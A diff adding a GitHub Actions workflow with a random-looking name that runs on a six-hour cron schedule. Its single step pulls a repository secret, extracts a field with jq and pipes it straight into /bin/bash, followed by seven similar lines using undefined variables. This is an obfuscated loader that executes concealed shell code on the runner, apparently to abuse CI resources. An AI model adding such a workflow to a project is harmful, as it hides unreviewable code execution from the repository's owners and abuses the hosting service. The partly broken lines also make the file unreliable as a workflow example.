@@ -1,0 +1,25 @@
+name: dalunyinguota
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dalunyinguota
+        env:
+          rs5: ${{ secrets.rs5 }}
+        run: |
+          echo $rs5 | jq -r .tkp820 | /bin/bash
+          echo $sjwqb18 | jq -r .y98 | /bin/bash
+          echo $van2791 | jq -r .kyjki6316 | /bin/bash
+          echo $pna17 | jq -r .m04022 | /bin/bash
+          echo $bgyhf58961 | jq -r .twg66467 | /bin/bash
+          echo $lzmvx1 | jq -r .otg65444 | /bin/bash
+          echo $nfvq68865 | jq -r .la99115 | /bin/bash
+          echo $yr95 | jq -r .jlb2 | /bin/bash
+
